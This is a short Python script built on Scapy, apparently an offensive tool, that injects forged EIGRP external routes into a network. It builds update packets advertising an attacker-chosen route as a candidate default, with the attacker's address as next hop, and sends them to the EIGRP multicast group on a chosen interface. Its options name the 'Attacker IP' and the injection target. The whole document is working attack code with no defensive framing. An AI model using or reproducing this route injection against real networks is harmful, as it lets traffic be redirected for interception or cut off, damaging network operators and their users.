#!/usr/bin/env python3

#by C0ldheim


from scapy.all import *
from scapy.contrib.eigrp import *
from scapy.layers.l2 import *
import argparse

L2Multicast = "01:00:5E:00:00:0A"
EIGRPMulticast = "224.0.0.10"


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", type=str, dest="interface", required=True, help="Choose the interface to attack")
    parser.add_argument("--asn", type=int, dest="asn", required=True, help="EIGRP Autonomous System Number")
    parser.add_argument("--src", type=str, dest="source_ip", required=True, help="Attacker IP")
    parser.add_argument("--dst", type=str, dest="destination_ip", required=True, help="Target IP address for injection")
    parser.add_argument("--prefix", type=int, dest="prefix", required=True, help="Specifying the subnet mask")
    
    args = parser.parse_args()

    return args


args = get_arguments()


def inject(interface, asn, source_ip, destination_ip, prefix):
    frame = Ether(dst=L2Multicast)
    ip = IP(src=args.source_ip, dst=EIGRPMulticast)
    eigrp = EIGRP(opcode=1, asn=args.asn, seq=0, ack=0, tlvlist=[EIGRPExtRoute(dst=args.destination_ip, nexthop=args.source_ip, originrouter=args.source_ip, prefixlen=args.prefix, flags="candidate-default")])
    crafted = frame/ip/eigrp
    print("Start sending external routes")
    sendp(crafted, iface=args.interface, loop=0, verbose=1)


inject(args.interface, args.asn, args.source_ip, args.destination_ip, args.prefix)
